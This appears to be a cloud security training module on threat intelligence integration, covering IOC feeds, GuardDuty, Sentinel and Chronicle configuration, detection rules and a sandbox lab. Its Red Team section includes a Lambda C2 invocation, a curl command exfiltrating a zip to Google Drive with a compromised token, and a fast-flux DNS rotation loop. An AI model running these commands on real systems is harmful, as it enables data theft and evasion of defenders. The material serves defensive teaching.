# 10 — Threat Intelligence Integration

> **Level:** Intermediate
> **Prereqs:** [Detection as Code: Sigma & Cloud Custodian](detection-as-code-sigma-and-custodian.md)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Resource Development, Reconnaissance, Discovery
> **Authorization scope:** Run only in your own sandbox accounts. Threat intel feed examples use publicly available sources. IOC confidence scoring uses placeholder values for illustration.

## What & why

Threat intelligence (CTI) integration enriches security detections with external knowledge — known-bad IPs, domains, file hashes, and adversary TTPs — so your SIEM distinguishes a misconfigured internal tool from a C2 callback to a known APT infrastructure. Without TI, every outbound connection looks equally suspicious. With it, you can triage with confidence: 99% of alerts are noise, but the one IoC match is the intrusion.

## The OnPrem reality

On-prem TI was consumed as flat IOC feeds (CSV of bad IPs), imported weekly into the SIEM, and matched against firewall/IDS logs. The feeds were often stale (30- to 90-day rotation), not cloud-contextualized (no AWS/Azure/GCP service IPs), and produced false positives when internal services contacted cloud provider IP ranges used by shared infrastructure. Cloud-native TI addresses these gaps with provider-validated threat lists and TTP-based (not just IOC-based) detection enrichment.

## Core concepts

### CTI feed taxonomy

| Feed type | Examples | Update frequency | Use case |
|---|---|---|---|
| Open-source / community | AlienVault OTX, Abuse.ch, OpenPhish | Hourly-daily | Broad threat landscape awareness |
| Commercial | CrowdStrike, Mandiant, Recorded Future | Real-time | High-confidence enrichment |
| Cloud-native | GuardDuty threat lists, Azure Sentinel TI, GCP Chronicle IoC | Real-time (managed) | Cloud-specific threats (crypto-mining IPs, known-bad ASNs) |
| Government / ISAC | DHS AIS, FS-ISAC, MS-ISAC | Daily | Sector-specific threats |
| MITRE ATT&CK | TTPs, software, groups | Quarterly releases | TTP-based detection (not IOC) |

### IOC lifecycle

```
Ingest → Validate → Enrich → Expire → Retire
  │        │         │         │         │
  │   Remove invalid  │    Auto-expire  Archive
  │   (RFC1918, bogons)│   after TTL     for audit
  │                    │
  └── Apply confidence scoring
```

### IOC types and confidence

| IOC type | Example | Typical TTL | Common false positive |
|---|---|---|---|
| IPv4 | 203.0.113.42 | 7–30 days | Cloud provider IPs (shared infra) |
| Domain | evil-c2.example.com | 30–90 days | CDN/DNS providers (CloudFront, Fastly) |
| URL | https://evil.example.com/payload | 7–30 days | Legitimate sites hosting user content (pastebin, S3) |
| File hash (SHA256) | abc123def... | 90–180 days | Common DLLs in different packaging |
| JA3/JARM fingerprint | TLS client/server fingerprints | 30 days | Load-balancer/shared-tool fingerprints |

## AWS

### GuardDuty threat lists

GuardDuty allows you to upload custom threat lists (IP sets and domain lists) that it matches against VPC Flow Logs and DNS logs:

```bash
# Upload a custom IP threat list
aws guardduty create-ip-set \
  --detector-id 12abc34d567e8f9012345d6789abcde0 \
  --name "corporate-threat-ips" \
  --format TXT \
  --location "s3://guardduty-threatlists/blocklist-2026-06-23.txt" \
  --activate

# The file contains one IP per line:
# 185.130.5.200
# 194.26.29.113
# 45.153.241.0/24

# Upload a domain threat list
aws guardduty create-threat-intel-set \
  --detector-id 12abc34d567e8f9012345d6789abcde0 \
  --name "corporate-threat-domains" \
  --format TXT \
  --location "s3://guardduty-threatlists/domainlist.txt" \
  --activate
```

**GuardDuty managed threat intel (built-in):** GuardDuty consumes AWS-internal threat intelligence (IPs associated with compromised EC2 instances, bitcoin mining pools, known C2 infrastructure) and generates findings automatically — no external feed setup needed.

### AWS Network Firewall — Suricata-based TI rules

```bash
# Deploy a stateful rule group with Suricata-compatible rules
aws network-firewall create-rule-group \
  --rule-group-name "threat-intel-block" \
  --type STATEFUL \
  --capacity 100 \
  --rule-group '{
    "StatefulRuleOptions": {"RuleOrder": "STRICT_ORDER"},
    "RulesString": "alert ip any any -> $EXTERNAL_NET any (msg:\"Known C2 IP hit\"; iprep:dst,known,10; sid:1000001;)"
  }'
```

## Azure

### Sentinel Threat Intelligence

Sentinel has a native TI blade that ingests structured threat intelligence (STIX/TAXII) feeds:

```bash
# Upload a STIX 2.0/2.1 TI file to Sentinel
az sentinel threat-indicator create \
  --resource-group sec-rg \
  --workspace-name sentinel-workspace \
  --threat-indicator-file ./ti-feeds.json
```

**Sentinel TI match query (KQL):**
```kql
// Match CommonSecurityLog against TI indicators
CommonSecurityLog
| where isnotempty(DestinationIP)
| join kind=inner (
    ThreatIntelligenceIndicator
    | where Active == true
    | where ExpirationDateTime > now()
) on $left.DestinationIP == $right.NetworkIP
| project TimeGenerated, SourceIP, DestinationIP, ThreatType, Description, ConfidenceScore
```

### Azure Defender TI enrichment

Defender for Cloud automatically enriches security alerts with Microsoft Threat Intelligence. No configuration needed for managed enrichment — it's included in the Standard tier.

```bash
# View TI-enriched alerts
az security alert list \
  --resource-group sec-rg \
  --expand "properties/extendedProperties/ThreatIntel"
```

## GCP

### Chronicle / Google Cloud Threat Intelligence

Chronicle (Google's cloud-native SIEM) integrates Google's threat intelligence — including Safe Browsing data and VirusTotal integration:

```bash
# Chronicle YARA-L rule with TI match
rule c2_callback {
  meta:
    author = "security-team"
    severity = "High"
    description = "Detect outbound connection to known C2 IP"
  events:
    $net.metadata.event_type = "NETWORK_CONNECTION"
    $net.target.ip = $target_ip
    $ti.graph.metadata.threat.threat_type = "C2_INFRASTRUCTURE"
    $ti.graph.metadata.entity_type = "IP_ADDRESS"
    match:
      $target_ip over 5m
  condition:
    $net and $ti
}
```

### SCC threat detection

Security Command Center Premium includes Event Threat Detection (ETD) that matches cloud audit logs against Google's threat intelligence:

```bash
# Enable Event Threat Detection
gcloud scc settings update \
  --organization 111111111111 \
  --enable-event-threat-detection

# List ETD findings
gcloud scc findings list \
  --organization 111111111111 \
  --source "etd" \
  --filter "state=ACTIVE"
```

## OnPrem mapping (recap table)

| Concern | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| Native TI feed | Commercial (Anomali, ThreatConnect) | GuardDuty managed + custom lists | Sentinel TI blade | Chronicle + ETD |
| IOC ingestion format | STIX/TAXII, CSV, JSON | TXT (IP set) + TXT (domain) | STIX 2.0/2.1 | Chronicle Data Feeds (JSON) |
| TTP-based enrichment | Manual mapping to ATT&CK | GuardDuty finding types map to ATT&CK | Defender alerts map to ATT&CK | ETD findings map to ATT&CK |
| TI matching log source | SIEM-collected logs | VPC Flow Logs + DNS logs | CommonSecurityLog + SigninLogs | Cloud Audit Logs + VPC Flow Logs |
| Managed feed included | No (third-party only) | Yes (GuardDuty built-in) | Yes (Microsoft TI in Defender) | Yes (Google TI in ETD + Chronicle) |
| Feed curation | SOC analyst manual review | Auto-sync from S3 | Auto-sync via Sentinel connector | Auto-sync via Chronicle ingestion |

## 🔴 Red Team view

Attackers understand that defenders rely on threat intel feeds and actively exploit their weaknesses.

### Technique 1 — Feed poisoning

An attacker submits false-positive IOCs to open-source TI feeds (AlienVault OTX, Abuse.ch). If defenders consume these feeds without validation, the attacker can:

1. **Disguise attack infrastructure:** Submit benign IPs belonging to the target's corporate network or CDN as "malicious" — this causes the defender to alert on their own infrastructure and eventually develop alert fatigue.

2. **False-positive flooding:** Submit 10,000 IOCs of legitimate services — the defender's SIEM is flooded with false positives, and analysts start ignoring TI-based alerts entirely.

3. **Reputation killing:** Submit a competitor's IPs and domains as malicious, causing their emails to be blocked and their infrastructure flagged.

### Technique 2 — Living-off-the-land (LoL) infrastructure

Attackers use infrastructure that will never appear in threat feeds:

```bash
# Use AWS Lambda as C2 (no fixed IP, AWS-owned IP space — never in blocklists)
aws lambda invoke --function-name attacker-c2-proxy \
  --payload '{"cmd":"whoami"}' /dev/stdout

# Use Google Drive for data exfiltration
curl -X POST https://www.googleapis.com/upload/drive/v3/files \
  -H "Authorization: Bearer $COMPROMISED_TOKEN" \
  -F "file=@exfiltrated_data.zip"
```

AWS/GCP IP ranges are unlikely to be blocked because they're shared with legitimate services. A GuardDuty threat list containing 3.5.0.0/16 would break access to half the AWS services in us-east-1.

### Technique 3 — IOC churn (fast-flux DNS)

```bash
# Attacker scripts automated infrastructure rotation every 6 hours
# TI feed TTL is 24 hours — so the defender is always 18 hours behind
for ip in $(shuf -n 1 /tmp/attacker-ip-pool); do
  curl https://api.cloudflare.com/client/v4/zones/$ZONE_ID/dns_records/$RECORD_ID \
    -X PATCH -H "Authorization: Bearer $CF_TOKEN" \
    -d "{\"content\":\"$ip\"}"
  sleep 21600  # 6 hours
done
```

**Artifacts left:** DNS change logs (Cloudflare/Route53/Cloud DNS audit logs) show the rapid rotation. The domain's TTL will be unusually low (60 seconds for fast-flux). The attacker's own automation leaves patterns (consistent ASN, consistent registrar) even as the IPs rotate.

## 🔵 Blue Team view

### Feed curation and confidence scoring

Never auto-block on a single feed. Use confidence scoring and multi-source corroboration:

```python
# Conceptual confidence scoring algorithm
def score_ioc(indicator, sources):
    base_confidence = 0
    for source in sources:
        if source == "commercial_premium":
            base_confidence += 40
        elif source == "cloud_native":
            base_confidence += 35
        elif source == "government_isac":
            base_confidence += 20
        elif source == "open_source":
            base_confidence += 10
        else:
            base_confidence += 5

    # Age decay: indicators older than 30 days lose confidence
    if indicator.age_days > 30:
        base_confidence *= 0.5

    # Thresholds
    if base_confidence >= 70:
        return "BLOCK"
    elif base_confidence >= 40:
        return "ALERT"
    else:
        return "LOG_ONLY"
```

### Automated IOC lifecycle management

```bash
# Daily cron: expire IOCs older than TTL
# AWS GuardDuty — update threat list from curated source
aws s3 cp s3://curated-threat-feeds/daily-blocklist.txt /tmp/blocklist.txt
aws guardduty update-ip-set \
  --detector-id 12abc34d567e8f9012345d6789abcde0 \
  --ip-set-id abc123 \
  --location "s3://guardduty-threatlists/daily-blocklist-$(date +%Y-%m-%d).txt" \
  --activate
```

### Sentinel TI workflow

```kql
// Query: identify stale IOCs (older than 30 days, still active)
ThreatIntelligenceIndicator
| where Active == true
| where ExpirationDateTime < now()
| project IndicatorId, ThreatType, Description, ExpirationDateTime
| order by ExpirationDateTime asc
```

**Automation rule — expire stale IOCs:**
```kql
// Logic App: daily job that sets Active=false for expired indicators
// Uses Sentinel API: PATCH /threatintelligence/indicators/{id}
```

### TTP-based enrichment (beyond IOCs)

IOCs are ephemeral; TTPs are durable. Map every detection to MITRE ATT&CK TTPs:

| Detection | IOCs | TTPs (stable) | Enrichment value |
|---|---|---|---|
| Credential harvesting from metadata endpoint | 169.254.169.254, uncommon User-Agent | T1552.005 (Unsecured Credentials: Cloud Instance Metadata API) | Hardens detection against IP/UA rotation |
| Crypto-mining DNS queries | miningpool.com, pool.hashvault.pro | T1496 (Resource Hijacking) | Catches new mining pools not yet in threat feeds |
| Cross-account assume-role from unknown account | Specific account ID | T1078.004 (Cloud Accounts) | Catches any unknown cross-account trust |

### Threat hunting with ATT&CK Navigator

Layer cloud-specific ATT&CK techniques onto your detection coverage map:

```json
{
  "name": "Detection Coverage by ATT&CK Technique",
  "techniques": [
    {"techniqueID": "T1078.004", "comment": "Covered: GuardDuty + CloudTrail assume-role alerts"},
    {"techniqueID": "T1525", "comment": "Covered: Kyverno admission control for image mutability"},
    {"techniqueID": "T1613", "comment": "Gap: no detection for container discovery commands"}
  ]
}
```

## Hands-on lab

1. Enable GuardDuty and upload a custom threat list:
```bash
aws guardduty create-detector --enable
# Get the detector ID
detector_id=$(aws guardduty list-detectors --query DetectorIds[0] --output text)

# Create a threat list with a test IP (your own sandbox IP — not real attacker IPs)
echo "203.0.113.1" > /tmp/test-blocklist.txt
aws s3 cp /tmp/test-blocklist.txt s3://your-threatlist-bucket/test-blocklist.txt

aws guardduty create-ip-set \
  --detector-id $detector_id \
  --name "test-blocklist" \
  --format TXT \
  --location "s3://your-threatlist-bucket/test-blocklist.txt" \
  --activate
```

2. Verify the feed is active:
```bash
aws guardduty list-ip-sets --detector-id $detector_id
```

3. In Azure, upload a STIX indicator to Sentinel (free tier):
```bash
# Create a test STIX indicator JSON
cat > stix-indicator.json << 'EOF'
{
  "type": "indicator",
  "spec_version": "2.1",
  "pattern": "[ipv4-addr:value = '203.0.113.99']",
  "pattern_type": "stix",
  "valid_from": "2026-06-23T00:00:00Z",
  "labels": ["malicious-activity"],
  "confidence": 80
}
EOF

az sentinel threat-indicator create \
  --resource-group sec-rg \
  --workspace-name sentinel-workspace \
  --threat-indicator-file ./stix-indicator.json
```

**Teardown:**
```bash
# AWS
aws guardduty delete-ip-set --detector-id $detector_id --ip-set-id $ip_set_id
aws guardduty delete-detector --detector-id $detector_id

# Azure
az sentinel threat-indicator delete --name <indicator-id> --resource-group sec-rg --workspace-name sentinel-workspace

rm /tmp/test-blocklist.txt stix-indicator.json
```

## Detection rules & checklists

**Sigma rule — connection to TI-matched IP:**
```yaml
title: Network Connection to Threat Intelligence IP
logsource:
  product: aws
  service: vpcflowlogs
detection:
  selection:
    dstAddr|threatintel: known-malicious
  condition: selection
level: high
```

**Checklist:**
- [ ] At least one managed TI feed enabled (GuardDuty / Defender for Cloud / ETD).
- [ ] Curated open-source feeds ingested with multi-source confidence scoring.
- [ ] IOC expiration automated: no IOC older than 30 days actively alerting without review.
- [ ] TI-based detections enriched with TTP mapping (MITRE ATT&CK technique IDs).
- [ ] Feed poisoning detection: alert when >20% of new IOCs match legitimate cloud provider IP ranges.
- [ ] Quarterly review: TI detection signal-to-noise ratio (target: >10% of TI alerts lead to investigation).
- [ ] Threat hunting informed by ATT&CK Navigator coverage gap analysis.

## References
- [AWS GuardDuty Threat Lists](https://docs.aws.amazon.com/guardduty/latest/ug/working-with-threat-intel-sets.html)
- [Azure Sentinel Threat Intelligence](https://learn.microsoft.com/en-us/azure/sentinel/threat-intelligence-integration)
- [GCP Event Threat Detection](https://cloud.google.com/event-threat-detection/docs)
- [MITRE ATT&CK Cloud Matrix](https://attack.mitre.org/matrices/enterprise/cloud/)
- [AlienVault OTX](https://otx.alienvault.com/)
- [STIX 2.1 Specification](https://docs.oasis-open.org/cti/stix/v2.1/stix-v2.1.html)
- [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
- [MITRE ATT&CK — Threat Intelligence (T1583)](https://attack.mitre.org/techniques/T1583/)
